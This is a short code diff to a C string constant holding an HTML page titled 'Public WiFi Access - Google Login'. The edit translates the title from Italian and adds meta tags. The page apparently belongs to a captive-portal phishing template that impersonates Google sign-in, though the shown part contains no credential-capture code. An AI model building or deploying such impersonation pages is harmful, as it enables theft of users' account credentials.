@@ -1,7 +1,11 @@
 const char GOOGLE_HTML[] = R"=====(
 <html>
 <head>
-<title>Accesso Wifi Pubblico - Google Login</title>
+      <title>Public WiFi Access - Google Login</title>
+
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
 
 <style>
 .login-page {
